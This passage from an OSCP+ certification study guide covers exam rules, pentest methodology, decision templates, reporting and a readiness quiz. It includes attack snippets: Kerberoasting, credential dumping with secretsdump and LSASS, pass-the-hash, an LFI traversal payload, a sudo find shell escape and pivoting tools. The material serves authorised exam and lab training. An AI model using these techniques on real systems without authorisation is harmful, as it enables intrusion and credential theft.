[AD-QUICK] [AD-ENUM] [AD-USER] [AD-CREDENTIALS] [KERBEROS-QUICK] [AD-KERBEROAST] [AD-ASREP]
[AD-ACL] [AD-LATERAL] [AD-BLOODHOUND] [AD-ATTACK-PATH]
[PIVOT-QUICK] [PIVOT-CHISEL] [PIVOT-LIGOLO] [PIVOT-SSH] [PIVOT-TROUBLESHOOTING]
[CREDENTIALS-QUICK] [HASH-IDENTIFICATION]
[FOUND-CREDS] [FOUND-SSHKEY] [FOUND-SUID] [FOUND-SUDO] [FOUND-SMB] ... [FOUND-PIVOT]
[STUCK-PROTOCOL] [WHEN-TO-MOVE-ON] [TROUBLESHOOTING-QUICK]
```

---

# PART 0 — [CURRENT-OSCP+] THE EXAM AS OF AUGUST 2026

### [OFFICIAL OFFSEC] What OSCP+ is
- **OSCP+** is what you earn by passing the current PEN-200 exam (structure in place since **Nov 1, 2024**). Passing grants **both** the lifetime **OSCP** and the **OSCP+** designation.
- **OSCP+ expires 3 years** after issuance. The underlying **OSCP never expires**. If you let the "+" lapse you keep OSCP for life. Renew the "+" by: passing a recert exam within 6 months of expiry, passing another qualifying OffSec cert (OSEP/OSWA/OSED/OSEE), or completing OffSec's CPE/PEN-200 continuing-education program.

### [OFFICIAL OFFSEC] Exam format
- **Duration:** 23 hours 45 minutes hands-on, then **24 hours** to write and upload the report.
- **Total 100 points. Pass = 70.**
- **1 Active Directory set = 40 points.** Three chained Windows hosts modelling a small enterprise (typically a domain-joined workstation → member server → domain controller). **You must fully compromise the chain to get the 40** — it is effectively all-or-nothing; a partial AD compromise does not net partial exam-passing value in practice. **Treat AD as the exam.**
- **3 standalone machines = 20 points each (60 total).** Each machine: **10 points for the low-priv flag (`local.txt`)** and **10 points for root/SYSTEM (`proof.txt`)**.
- **Bonus points are GONE.** [OFFICIAL OFFSEC] There is no longer a lab/exercise bonus safety net. **You need a clean 70 on the day.** Practically: AD (40) + two full standalones (40) = 80 → pass. Or AD (40) + one full standalone (20) + two low-priv (20) = 80. **Losing the AD set means you must root all three standalones AND get extra — very hard. Prioritize AD.**

### [OFFICIAL OFFSEC] Tool rules (the ones people fail on)
- **Metasploit / Meterpreter: ONE target only.** You may use MSF exploit/post modules or a Meterpreter payload against a **single machine of your choice** for the whole exam. **Not** on the AD set for pivoting. Auxiliary modules (scanners) are treated more leniently but **don't gamble** — assume MSF = one box, use manual methods everywhere else.
- **Allowed freely:** nmap, nikto, gobuster/feroxbuster/ffuf, Burp Community, netexec/CrackMapExec, impacket, evil-winrm, sqlmap (with restrictions — see below), Chisel/Ligolo/proxychains, hashcat/john, manual exploits, public exploit code you understand.
- **`sqlmap`:** allowed in some contexts but the exam guide restricts automated exploitation tools; **do SQLi manually for the exam** and only lean on sqlmap where explicitly permitted. Confirm on the current exam guide.
- **Banned:** commercial/automated exploitation frameworks beyond the MSF single-target rule, automated AD-exploitation "one-click" tools, spoofing attacks not in scope, and **any AI tools that solve the box for you** (allowed for reference, not for auto-exploitation — check current guide).

### [OFFICIAL OFFSEC] Proof requirements (people LOSE points here)
- Submit the **contents** of `local.txt` and `proof.txt` AND a **screenshot** on each machine showing **the flag + `ipconfig`/`ip a` + `whoami`/`id` in the same shot**. A bare flag string is rejected — it doesn't prove *which host* and *what privilege*.
- Screenshot must be a real screenshot (not copy-paste of text). Show the exploit working.
- The **report is graded.** No report = no pass even if you got 70 points of flags. See `[REPORTING]`.

### [COMMUNITY] What changed vs old OSCP advice (don't reuse stale guides)
- **AD is now the centre of gravity**, not an afterthought. Old "just root 3 boxes + buffer overflow + bonus" advice is dead.
- **No buffer-overflow box** in the current exam focus. Classic 25-point custom-stack-BOF grind is **not** where to spend prep time. (Know basic BOF concept; don't over-drill it.)
- **No bonus points** → margin for error is smaller. **Enumeration discipline > exploit collection.**
- Assumed-breach style AD (you're often given a starting credential/foothold into AD) is the common pattern — **practice from a domain user forward.**

---

# PART 1 — [OSCP-MINDSET] HOW TO THINK

## [QUICK] What the exam actually tests
Not "do you know exploit X." It tests: **can you enumerate thoroughly, notice the one detail that matters, form a hypothesis, test it cheaply, and move on when it fails — for 24 hours without tunnel-visioning.** It's an *enumeration and decision-making* exam wearing an exploitation costume.

## [MEMORIZE vs LOOKUP]
**Make muscle memory (type without thinking):**
- Your nmap two-step (fast all-ports → targeted `-sCV`).
- SMB/AD triage: `nxc smb <ip>`, `nxc smb <ip> -u '' -p ''`, `enum4linux-ng`.
- Reverse shell one-liner + `nc -lvnp`, TTY upgrade (`python3 -c 'import pty...'` + `stty`).
- `sudo -l`, `id`, `find / -perm -4000`, `linpeas`, `winpeas`, `whoami /priv`.
- File transfer: `python3 -m http.server 80` + `wget`/`curl`/`certutil`.
- Kerberoast / AS-REP one-liners, `secretsdump`, `evil-winrm -i ip -u u -p p`.

**Recognize, don't memorize (look up exact flags):** ffuf/feroxbuster syntax, Chisel/Ligolo command chains, hashcat modes, impacket sub-tool flags, ldapsearch filters, sqlmap flags.

**Never memorize:** every GTFOBins entry, every CVE, long exploit payloads. Keep a searchable notes file (this KB) and GTFOBins/HackTricks bookmarks.

## [PENTESTER-MINDSET] How experienced testers think
1. **Enumerate to a hypothesis, not to a list.** Every finding should end with "so I can try ___." If a finding doesn't suggest an action, log it and move on.
2. **Breadth before depth.** Get *all* services and *all* web content mapped before deeply attacking any one thing. The answer is usually in something you haven't looked at yet, not deeper in what you're staring at.
3. **Cheapest test first.** Anonymous login, default creds, known-CVE check — 2 minutes — before writing custom exploits.
4. **Credentials are the universal key.** Every cred you find → try it *everywhere* (SMB, SSH, WinRM, web login, MSSQL, AD, database). Password reuse solves a huge fraction of boxes.
5. **The box was built to be solved with a designed path.** If something feels absurdly hard or needs 0-day skill, you're in a rabbit hole — the intended path is simpler and you missed enumeration.
6. **Write everything down as you go** (see `[MACHINE-JOURNAL]`). Half of "stuck" is "forgot what I already found."

## [HYPOTHESIS-LOOP] The core loop
```
ENUMERATE → NOTICE anomaly/version/misconfig → HYPOTHESIS ("this looks like X, X is exploitable by Y")
→ CHEAP TEST → if works: EXPLOIT; if not: log why, NEXT hypothesis
```
A hypothesis has: a **claim**, a **test**, and a **timebox**. No timebox = rabbit hole.

## [RABBITHOLE-DETECTION] Signs you're in one
- You've spent >30 min and haven't formed a *new* hypothesis, just retried variants of the same one.
- You're editing a public exploit you don't understand, hoping.
- You're brute-forcing something with no evidence it's the path.
- You found something "interesting" and are chasing it because it's interesting, not because evidence points there.
- **Fix:** `[STUCK-PROTOCOL]` (Volume 6 has full version; core: re-enumerate, list untried surfaces, switch target).

---

# [OSCP-GOLDEN-RULES]  (pin these)

1. **AD first, AD hardest — protect the 40 points.** Budget your biggest block of fresh-brain time for the AD set.
2. **Enumerate all ports and all web content before exploiting anything.** Depth-first is the #1 cause of failure.
3. **Every credential gets sprayed everywhere.** New password → SMB, WinRM, SSH, web, MSSQL, RDP, and as other users.
4. **Cheapest test first:** anonymous → default creds → known CVE → manual exploit → custom.
5. **If it needs a 0-day or a miracle, you missed enumeration.** Go back and re-scan / re-read output.
6. **Timebox every hypothesis (15/30 rule).** 15 min no progress → re-read output. 30 min no progress → switch surface or target, note where you were.
7. **Screenshot proof the moment you get a flag** (flag + `id`/`whoami` + `ip`). Do it *now*, not "later."
8. **Take notes continuously.** If it's not written down, it didn't happen. One file per target.
9. **Re-run enumeration after every privilege change** (new user, new host, new network). New access = new attack surface.
10. **Read tool output — actually read it.** The answer is usually already on your screen (a version, a share, a username, a path).
11. **Full TCP port scan always** (`-p-`). The intended service is often on a weird high port.
12. **UDP matters sometimes** (SNMP 161, DNS 53, TFTP 69) — do a quick top-UDP scan, don't obsess.
13. **Manual first for the exam** — Metasploit is one box only. Build manual muscle memory in prep.
14. **Password reuse and weak creds beat exploits** more often than you'd think. Always try the obvious.
15. **When you get a shell, stabilize it before doing anything** (TTY / `stty`). Unstable shells lose you work.
16. **Kerberoast + AS-REP roast every AD engagement** — cheap, high value, no special privileges needed.
17. **BloodHound early in AD.** Collect data as soon as you have any domain creds; let the graph find the path.
18. **Don't over-trust automated scanners.** linpeas/winpeas/nmap scripts miss things and produce false positives — verify manually.
19. **One target's loot unlocks others.** Hashes/keys/passwords from box A are your first move on box B.
20. **Rotate targets to break tunnel vision.** Stuck on standalone #2? Go work AD, come back with fresh eyes.
21. **Verify you understand a public exploit before running it** — wrong target/arch/version can crash the box (costs you a revert and time).
22. **Save every artifact** (scan outputs, hashes, screenshots, exploit code you used) into the target folder immediately.
23. **`whoami /priv` and `sudo -l` are the first thing on any shell.** Free wins live there.
24. **Check for creds in: config files, history, backups, DB, memory, `.git`, home dirs.** Loot is everywhere.
25. **Reverts are free — use them** if a box behaves weirdly (crashed service, prior tester's shell). Don't debug a broken box for an hour.
26. **The report is part of the exam.** Screenshot and command-log as you go; writing it after with no notes is how people fail after passing.
27. **Don't install/one-click auto-exploit AD tools on the exam.** Manual impacket/nxc/BloodHound only.
28. **Sleep and eat.** A 20-minute break at hour 8 beats grinding a rabbit hole for 2 hours. Fatigue = tunnel vision.
29. **If two readings of the evidence differ, do the cheaper test first** rather than debating.
30. **Momentum beats perfection.** A working ugly path > an elegant one you can't finish. Get the flag, clean up in the report.

---

# PART 2/3 — [MASTER-METHODOLOGY] ATTACKING AN UNKNOWN MACHINE

> Each stage: **OBJECTIVE / ASK / FIRST CMDS / DEEPER / OUTPUT THAT MATTERS / NEXT / MISTAKES / RABBIT HOLES / STOP / RETURN / EVIDENCE.** Commands are examples — service-specific detail lives in Volumes 1–5. `$IP` = target.

## [METHOD-0] STAGE 0 — TARGET TRIAGE
- **OBJECTIVE:** decide *what kind* of target and where it sits (standalone vs AD, Windows vs Linux, web-heavy vs service-heavy).
- **ASK:** Is this in the AD set or standalone? Windows or Linux? Is it likely the DC / a pivot? What did the exam brief give me (starting creds, scope, hostnames)?
- **FIRST:** read the exam control panel notes; set up `~/oscp/<target>/` with `scans/ loot/ exploits/ www/ notes.md`.
- **OUTPUT THAT MATTERS:** any provided credential, hostname, domain name.
- **NEXT:** host discovery / port scan.
- **MISTAKES:** starting nmap before reading the brief; not making a folder → losing artifacts.
- **EVIDENCE:** save the brief text into `notes.md`.

## [METHOD-1] STAGE 1 — HOST DISCOVERY
- **OBJECTIVE:** confirm host is up and reachable.
- **FIRST:** `ping -c2 $IP` (TTL≈64 Linux, ≈128 Windows — a hint, not proof). In exam each target IP is given, so mostly skip sweeps.
- **DEEPER (internal/pivot subnet):** `nxc smb 10.10.10.0/24`, `fping -a -g 10.10.10.0/24 2>/dev/null`, nmap `-sn`.
- **OUTPUT:** TTL for OS guess; which hosts alive in a pivoted subnet.
- **RABBIT HOLE:** obsessing over ping when ICMP is filtered — just scan ports (`-Pn`).
- **NEXT:** TCP enumeration.

## [METHOD-2] STAGE 2 — TCP ENUMERATION  → see `[NMAP-TCP]`
- **OBJECTIVE:** every open TCP port + service/version.
- **FIRST (two-step, memorize):**
  ```
  nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP
  nmap -p<csv> -sCV -Pn -oN scans/tcp-scv.txt $IP
  ```
- **OUTPUT THAT MATTERS:** exact versions (→ CVE search), unusual high ports, web ports (80/443/8080/8000/8443…), 445/139 (SMB), 88/389/636/3268 (AD/DC), 5985 (WinRM), 3306/1433/5432 (DBs).
- **NEXT:** per-service enum (Vol 1); web ports → Vol 2.
- **MISTAKES:** scanning only top-1000; trusting `-sV` guess over manual probing.
- **STOP:** once you have all ports + versions. Don't re-scan repeatedly.
- **EVIDENCE:** keep `all-tcp.txt` and `tcp-scv.txt`.

## [METHOD-3] STAGE 3 — UDP ENUMERATION → `[NMAP-UDP]`
- **OBJECTIVE:** catch SNMP/DNS/TFTP/Sip/IKE that TCP misses.
- **FIRST:** `nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $IP`
- **OUTPUT:** 161 SNMP (→ `snmpwalk`, huge loot), 69 TFTP, 53 DNS, 500 IKE.
- **RABBIT HOLE:** full UDP `-p-` scan (slow, rarely needed). Top-100/200 is enough.
- **NEXT:** enumerate any UDP service found.

## [METHOD-4] STAGE 4 — SERVICE ENUMERATION → Volume 1
- **OBJECTIVE:** for each open service: version, auth options, anonymous access, config, loot.
- **ASK per service:** Can I access it anonymously? Are there default creds? Do I have creds that work here? What version → known exploit? What does it *lead to*?
- **NEXT:** feed creds/paths into Initial Access.

## [METHOD-5] STAGE 5 — WEB ENUMERATION → Volume 2 `[WEB-*]`
- **OBJECTIVE:** map the whole app before attacking: tech stack, all content, all params, auth.
- **FIRST:** `whatweb http://$IP`, view source, `/robots.txt`, feroxbuster/ffuf dir brute, vhost brute if a hostname appears.
- **OUTPUT:** CMS + version, login pages, upload forms, params, hidden dirs, vhosts, API endpoints, comments/keys in JS.
- **MISTAKES:** attacking the first form you see before mapping; ignoring vhosts; not adding hostname to `/etc/hosts`.
- **RABBIT HOLE:** brute-forcing dirs for an hour with a giant wordlist; over-fuzzing one param.

## [METHOD-6] STAGE 6 — CREDENTIAL DISCOVERY → `[CREDENTIALS-QUICK]`
- **OBJECTIVE:** collect every username/password/hash/key from all sources so far.
- **ASK:** default creds? creds in configs/DB/git/SNMP/comments? usernames to spray?
- **NEXT:** spray creds across every service (Golden Rule 3).

## [METHOD-7] STAGE 7 — VULNERABILITY IDENTIFICATION → `[EXPLOIT-RESEARCH]`
- **OBJECTIVE:** turn versions/misconfigs into a concrete exploit hypothesis.
- **FIRST:** `searchsploit <product> <version>`, targeted web/GitHub search for `<product> <version> exploit/CVE`.
- **OUTPUT:** a specific, matched exploit (right version + arch + auth requirement).
- **MISTAKES:** running the first searchsploit hit blindly; ignoring auth prerequisites.
- **RABBIT HOLE:** CVEs that need conditions you can't meet; "PoC" repos that are fake/malware.

## [METHOD-8] STAGE 8 — INITIAL ACCESS → `[FOOTHOLD-CHECKLIST]`
- **OBJECTIVE:** first code execution / shell.
- **ASK:** cheapest path? (creds+service login > upload shell > injection > public exploit).
- **EVIDENCE:** screenshot the moment of access; save the exploit/command used.

## [METHOD-9] STAGE 9 — SHELL STABILIZATION → `[SHELL-QUICK]`
- **OBJECTIVE:** a stable, interactive shell you won't lose.
- **FIRST (Linux):** `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`.
- **Windows:** get to a better shell early (evil-winrm / RunasCs / a proper reverse shell); consider a Meterpreter here if this is your one MSF box.
- **MISTAKE:** doing complex work in a dumb `nc` shell and losing it.

## [METHOD-10] STAGE 10 — LOCAL ENUMERATION → Vol 4 `[LINUX-PRIVESC]` / `[WINDOWS-PRIVESC]`
- **OBJECTIVE:** everything the current user can see: who am I, privileges, other users, software, creds, network (pivot leads).
- **FIRST:** `id`/`whoami /all`, `sudo -l`/`whoami /priv`, then linpeas/winpeas *plus* manual checks.
- **OUTPUT:** privesc vectors, creds, other subnets/hosts (pivot), domain membership.

## [METHOD-11] STAGE 11 — PRIVILEGE ESCALATION → Vol 4
- **OBJECTIVE:** root / SYSTEM (or the next required privilege).
- **ASK:** quick wins first (sudo, SUID/GTFOBins, SeImpersonate, service perms) before kernel exploits.
- **EVIDENCE:** proof screenshot (`proof.txt` + `id`/`whoami` + `ip`).

## [METHOD-12] STAGE 12 — CREDENTIAL HARVESTING (post-root) → `[CREDENTIALS-QUICK]`
- **OBJECTIVE:** loot for lateral movement / other boxes.
- **FIRST (Linux):** `/etc/shadow`, SSH keys, history, `/var/www` configs, DB creds, `.env`.
- **Windows:** `secretsdump`/SAM+SYSTEM, LSASS, DPAPI, `cmdkey /list`, saved creds, `runas` targets, PowerShell history.
- **NEXT:** these creds → lateral movement / AD.

## [METHOD-13] STAGE 13 — LATERAL MOVEMENT → `[AD-LATERAL]`
- **OBJECTIVE:** use creds/hashes to reach another host.
- **FIRST:** `nxc smb <subnet> -u u -p p` to find where creds work; then evil-winrm / wmiexec / psexec / RDP / SSH.
- **RABBIT HOLE:** trying to privesc locally when the real path is "these creds admin *another* box."

## [METHOD-14] STAGE 14 — PIVOTING → Volume 5 `[PIVOT-*]`
- **OBJECTIVE:** route your tools into a network only the compromised host can reach.
- **FIRST:** Ligolo-ng (cleanest) or Chisel SOCKS + proxychains.
- **OUTPUT:** new subnet enumerated from your box via the pivot.

## [METHOD-15] STAGE 15 — AD ENUMERATION → `[AD-ENUM]`, `[AD-BLOODHOUND]`
- **OBJECTIVE:** map users, groups, computers, ACLs, delegations, kerberoastable/AS-REP targets.
- **FIRST:** with any domain cred → BloodHound collection (`bloodhound-python`/`nxc --bloodhound`), `nxc ldap`, `GetUserSPNs`, `GetNPUsers`.
- **NEXT:** shortest path to Domain Admin / target.

## [METHOD-16] STAGE 16 — AD ATTACK PATHS → `[AD-ATTACK-PATH]`
- Kerberoast → crack → reuse; AS-REP roast; ACL abuse (GenericAll/WriteDACL…); DCSync; delegation abuse. Follow BloodHound's path.

## [METHOD-17] STAGE 17 — OBJECTIVE / PROOF
- **OBJECTIVE:** grab `local.txt`/`proof.txt`; on AD, own the DC (DCSync/`secretsdump`, `administrator` hash, read proof on DC + member + workstation).
- **EVIDENCE:** per-machine proof screenshots. Log which credential/technique got you there.

## [METHOD-18] STAGE 18 — DOCUMENTATION → `[REPORTING]`
- Continuously: command + output + screenshot + which step it was. Never leave it all to the end.

---

# PART 4 — [PENTESTER-THOUGHT-PROCESS] DECISION TEMPLATES

**Template shape:** `FOUND → THINK (the questions) → NEXT (ordered actions)`.

### `[THINK-SMB]` FOUND: TCP 445/139 SMB
THINK: What can I get anonymously? Can I list shares? Enumerate users (RID cycling)? Do I already have creds — do they work here? Is this box domain-joined (→ AD)? Any readable/writable share with configs/backups? Can these creds/hashes work on *other* hosts (lateral)?
NEXT: 1) `nxc smb $IP -u '' -p ''` + `--shares` 2) `enum4linux-ng -A $IP` 3) `smbclient -N -L //$IP/` then read every readable share 4) if creds: `nxc smb $IP -u u -p p --shares --users --rid-brute` and spray on other hosts.

### `[THINK-WEB]` FOUND: HTTP(S)
THINK: What stack/CMS/version (→ known exploit)? Any login/upload/admin? Params to inject? Hidden dirs/vhosts? Creds or keys in source/JS/comments? Does a version match a public RCE?
NEXT: 1) `whatweb`+source+`/robots.txt` 2) dir+vhost brute 3) identify vuln class (SQLi/LFI/upload/SSTI/cmdinj) 4) searchsploit the CMS/version.

### `[THINK-CREDS]` FOUND: a credential
THINK: Where does this work? Same user elsewhere? Is it a password pattern (spray variants)? Local or domain? Does it unlock a second cred (DB→config→SSH)?
NEXT: 1) spray across SMB/WinRM/SSH/RDP/MSSQL/web/LDAP on this and other hosts 2) if domain → BloodHound as this user 3) log it in journal.

### `[THINK-LINSHELL]` FOUND: low-priv Linux shell → `[LINUX-PRIVESC-QUICK]`
THINK: `sudo -l` freebies? SUID/GTFOBins? cron/writable scripts? caps? creds in configs/history/DB? kernel old? am I in a container (escape)? other subnets (pivot)?
NEXT: 1) stabilize TTY 2) `id;sudo -l;find / -perm -4000 2>/dev/null` 3) linpeas 4) exploit quick win 5) loot creds.

### `[THINK-WINSHELL]` FOUND: low-priv Windows shell → `[WINDOWS-PRIVESC-QUICK]`
THINK: `whoami /priv` — SeImpersonate/SeAssignPrimaryToken (→ Potato)? service/registry/unquoted-path perms? AlwaysInstallElevated? saved creds/`cmdkey`? PowerShell history? domain-joined (→ AD)?
NEXT: 1) `whoami /all` 2) winpeas 3) if SeImpersonate → PrintSpoofer/GodPotato 4) check service perms/unquoted paths 5) loot creds → lateral.

### `[THINK-DOMAINUSER]` FOUND: valid domain user → `[AD-ATTACK-PATH]`
THINK: Kerberoastable SPNs? AS-REP roastable users? What does BloodHound say this user can reach/abuse? Password reuse to other hosts? Any ACL edges (GenericAll/WriteDACL)? Readable shares (GPP/scripts/creds)?
NEXT: 1) BloodHound collect 2) `GetUserSPNs`+`GetNPUsers` 3) `nxc smb <hosts> -u u -p p` spray 4) follow shortest BloodHound path.

### `[THINK-SPN]` FOUND: a Kerberoastable SPN → `[AD-KERBEROAST]`
THINK: Can I request the TGS (need any domain cred)? Is the account service/admin (high value)? Will the hash crack (weak password)?
NEXT: 1) `GetUserSPNs -request` 2) `hashcat -m 13100` with rockyou+rules 3) reuse cracked pw everywhere 4) check that account's privileges/BloodHound.

### `[THINK-HASH]` FOUND: an NTLM/other hash → `[HASH-IDENTIFICATION]`
THINK: What type (NTLM/NetNTLMv2/Kerberos/…)? Crackable or pass-the-hash directly? Which user/host?
NEXT: 1) identify type 2) if NTLM → try PtH (`nxc smb -H`) before cracking 3) else crack with right hashcat mode 4) reuse.

---

# PART 26 — [TIME-MANAGEMENT]

## [QUICK] Exam clock plan (23h45m)
- **Hour 0–0.5:** kick off nmap on *all* targets in parallel; read briefs; set up folders.
- **Hour 0.5–8:** **AD set first, freshest brain.** Get the AD chain moving. If AD stalls hard at ~3–4h with zero progress, pivot to a standalone and return.
- **Hour 8–16:** standalone machines. Rotate on the 30-min rule.
- **Hour 16–20:** finish/clean up, re-attempt stuck boxes with fresh eyes, chase remaining 10-pointers.
- **Hour 20–23:** **stop hacking; verify you have all proofs + screenshots.** Re-take any missing proof screenshot NOW.
- **+ next 24h:** write report.
- **Sleep:** most people should sleep ~4–6h somewhere (e.g., hour 10–15) — grinding tired loses more points than it gains.

## [WHEN-TO-MOVE-ON] The rules
- **15-min rule:** 15 min on one vector with no new info → re-read your scan/tool output, you missed something.
- **30-min rule:** 30 min, no new hypothesis → switch target/surface. Write down exactly where you stopped so return is instant.
- **Move on when:** you're retrying variants, editing an exploit you don't understand, or brute-forcing on a hunch.
- **Return when:** you've made progress elsewhere (new creds/fresh eyes), or you've exhausted other targets.
- **Revert a box** if a service is crashed or acting inconsistent (possibly your failed exploit or a stale state).

## [FATIGUE]
Eat, hydrate, 20-min walk every ~4h. Tunnel vision is a fatigue symptom. A break is faster than a rabbit hole.

---

# PART 27 — [REPORTING]

### [OFFICIAL OFFSEC] What's required
- A professional report (OffSec provides a template; you may use your own) uploaded within **24h** of the hacking window ending.
- **Per compromised host:** the vulnerability, step-by-step reproduction (commands + screenshots), the proof: **screenshot showing `local.txt`/`proof.txt` contents + `whoami`/`id` + `ip a`/`ipconfig` together**, and the flag string typed into the control panel.
- Enough detail that **someone else could reproduce** every step. Missing repro steps or missing proof screenshots lose the points for that host.

### [COMMUNITY] How to not lose points to reporting
- **Screenshot as you go, named clearly:** `webserver_10.1.1.5_local.txt.png`, `webserver_root_proof.png`. Don't rely on scrollback.
- Keep a **command log** per host (copy every command+key output into `notes.md` live). Reconstructing from memory after 24h fails.
- Take the **proof screenshot the instant** you land the flag — services get reverted, shells die.
- Include the exact **exploit code/commands you used** (if you modified a public exploit, include the diff).
- **Don't** include the KB/theory — the report is *what you did on these hosts*, reproducibly.
- Structure: Exec summary → methodology → per-host (enum → vuln → exploit → post-exploit/privesc → proof) → appendix (any extra).

> 📄 **Use the fillable `REPORT-TEMPLATE.md`** (same folder) — copy its per-host block for every machine, fill it in *as you go*, export to PDF.

### [REPORTING-SUBMISSION]  concrete submission specs (verify on the current guide)
```
Format   : a single PDF, placed INSIDE a .7z archive (no password)
Filename : OSCP-OS-XXXXX-Exam-Report.7z   (XXXXX = your OS-ID)
Upload   : https://upload.offsec.com   within 24h of the hacking window ending
Verify   : check the MD5 hash matches after upload (compute md5sum locally, compare)
Template : use OffSec's official OSCP+ .docx report template (export to PDF)
Content  : if you modified a public exploit, include your changes + why
```

### [REPORTING-CHECKLIST]
```
[ ] Every scored host has: repro steps, command evidence, proof screenshot (flag+id/whoami+ip)
[ ] Proof screenshot is from an INTERACTIVE shell (not a blind one-liner)
[ ] Flag strings entered in control panel AND shown in report
[ ] Screenshots legible, un-cropped, show the whole terminal + target IP visible
[ ] AD: show the full chain (each host owned) + how creds flowed
[ ] Methodology explained (the "why"), not just pasted commands
[ ] Single PDF → inside a no-password .7z, named OSCP-OS-XXXXX-Exam-Report.7z
[ ] Uploaded to upload.offsec.com before the 24h deadline; MD5 verified
```

---

# PART 31 — [MINIMUM-VIABLE-PREP]  (max machine time, min passive study)

### STUDY DEEPLY (this is where points are)
- **Active Directory** end-to-end: enum → Kerberoast/AS-REP → ACL abuse → lateral → DCSync. **Highest ROI. Do this most.**
- **Enumeration discipline** across all common services (Vol 1) until it's reflex.
- **Linux + Windows privesc** common vectors (Vol 4) — the top ~15 each cover most boxes.
- **Web:** SQLi, LFI/RFI, file upload, command injection, SSTI, auth bypass (Vol 2).
- **Pivoting** with Ligolo-ng or Chisel (Vol 5) — practise until it's boring.
- **Shell + file transfer + TTY** until automatic.

### STUDY LIGHTLY / RECOGNIZE ONLY
- Buffer overflow (basic concept only — not an exam focus now).
- Exotic web vulns (XXE, deserialization) — recognize + basic exploit, don't obsess.
- Obscure services — know how to enumerate anything unknown generically.

### MEMORIZE (muscle memory)
nmap two-step, TTY upgrade, reverse shell + listener, `python3 -m http.server`, `sudo -l`/`whoami /priv`, SUID find, SMB triage, Kerberoast/AS-REP one-liners, `secretsdump`, `evil-winrm`, `nxc` spray.

### PRACTICE (the actual plan)
- **Do machines, not videos.** Target: **~40–60+ practice boxes** before exam, heavily weighted to AD.
- **Best sources [COMMUNITY]:** OffSec's own **Challenge Labs / PEN-200 labs** (closest to exam), **Proving Grounds Practice** (OffSec-style, "OSCP-like" lists), **HTB** (use TJ Null's OSCP-like list + HTB Pro Labs for AD), **TryHackMe** for fundamentals/AD basics.
- For **every** box: enumerate fully, write notes as if reporting, then read a writeup **only after** to see what you missed. The gap between your notes and the writeup is your study list.
- Do **AD chains** (multi-host) specifically — single boxes don't train the 40-point set.

### SKIM / IGNORE FOR NOW
- Long theory courses, cert-guide reading marathons, memorizing CVE lists, advanced exploit dev, AV evasion (not needed for OSCP+), OSEP-level tradecraft.

---

# PART 32 — [7-DAY-PLAN]  (final week; assumes you've practised for weeks already)

> Goal: sharpen reflexes + AD, not learn new theory. ~1 focused box/AD-chain per day + drills. Don't cram.

**Day 1 — Enumeration reflexes.** Drill: nmap two-step, per-service enum on 2 standalone boxes start-to-foothold. Rebuild `[NMAP-QUICK]`/`[SMB-QUICK]` from memory. *Ignore:* privesc depth today. **Goal:** foothold in <45 min on a medium box.

**Day 2 — Linux privesc.** Do 2 Linux boxes focusing on privesc; drill `sudo -l`, SUID/GTFOBins, cron, caps, creds. Redo any `[LINUX-PRIVESC]` vector you fumble. **Goal:** root both, notes report-ready.

**Day 3 — Windows privesc.** 2 Windows boxes; drill SeImpersonate→Potato, service/unquoted-path, cred harvest. **Goal:** SYSTEM both.

**Day 4 — AD chain #1.** Full assumed-breach chain: enum→BloodHound→Kerberoast/AS-REP→lateral→DC. Time it. **Goal:** DC compromise + clean notes of cred flow.

**Day 5 — AD chain #2 + pivoting.** Another chain *through a pivot* (Ligolo/Chisel + proxychains). **Goal:** own an internal host only reachable via pivot.

**Day 6 — Full mock exam (mini).** AD set + 1–2 standalones under time pressure, screenshots + notes as if graded. Practice the proof-screenshot habit. **Goal:** find your weak stage.

**Day 7 — Light.** Review Day-6 weak spots, re-read your `[STUCK-PROTOCOL]` and Golden Rules, prep environment (VPN, tools, note template, screenshot tool, folder skeleton). **Sleep early.** *Ignore:* new topics. **Goal:** rested + tools ready.

---

# PART 33 — [READINESS-TEST]  (score yourself on *methodology*, not trivia)

Answer out loud, then check against the KB. Score 0–2 each (0 blank, 1 partial, 2 solid). **≥ 45/60 = ready.**

**Enumeration**
1. Ports 22, 80, 445 open. First 5 concrete actions, in order? *(nmap -sCV those ports; web map + dir/vhost brute; SMB anon `nxc`/`enum4linux-ng`/`smbclient -N -L`; try creds cross-service; searchsploit versions.)*
2. nmap shows `Apache 2.4.49`. What now? *(That version → CVE-2021-41773 path traversal/RCE — verify version exactly, test traversal, confirm before exploit.)*
3. UDP 161 open. Next command + why? *(`snmpwalk -v2c -c public $IP` → users, processes, creds, routes.)*

**Web**
4. You found a login + a version'd CMS. Order of attack? *(default/weak creds → searchsploit CMS version → SQLi on login → dir brute for admin/upload.)*
5. `?page=about` — hypothesis + test? *(LFI/RFI → `?page=../../../../etc/passwd` and php filter wrapper; if include → RCE via log/wrapper.)*

**Initial access**
6. searchsploit gives 3 hits for the version. How do you pick/verify before running? *(match exact version+arch+auth; read the code; check what it does; test non-destructively.)*

**Linux privesc**
7. Low-priv shell. First 4 commands? *(`id; sudo -l; find / -perm -4000 2>/dev/null; ` then linpeas.)*
8. `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/find`. Exploit? *(GTFOBins: `sudo find . -exec /bin/sh \; -quit`.)*

**Windows privesc**
9. `whoami /priv` shows `SeImpersonatePrivilege Enabled`. Path? *(PrintSpoofer / GodPotato → SYSTEM.)*
10. You find a service with a writable binary path / unquoted path with a writable dir. Steps? *(place payload, restart service or wait, get SYSTEM shell.)*

**AD**
11. You have one domain user's password. First 4 actions? *(BloodHound collect; Kerberoast `GetUserSPNs -request`; AS-REP `GetNPUsers`; spray creds on hosts with `nxc`.)*
12. BloodHound shows your user has `GenericAll` on another user. What do you do? *(force-change their password or targeted Kerberoast/shadow-creds; then use them.)*
13. You cracked a service account with an SPN. Next? *(reuse pw everywhere; check its group memberships/BloodHound; look for path to DA / DCSync.)*

**Pivoting**
14. You root a dual-homed host seeing `172.16.5.0/24`. How do you scan it from your box? *(Ligolo tunnel or Chisel SOCKS + proxychains; then `nxc`/nmap through proxy.)*

**Credentials / hashes**
15. You dumped an NTLM hash. Two things to try, in order? *(pass-the-hash with `nxc -H`/evil-winrm `-H` first; crack with hashcat `-m 1000` if PtH blocked.)*

**Troubleshooting**
16. Reverse shell won't connect. Diagnostic order? *(listener up? right LHOST/LPORT? egress port allowed? payload encoding/quoting? firewall? try 80/443; test with a simpler payload.)*

**Decision / stuck**
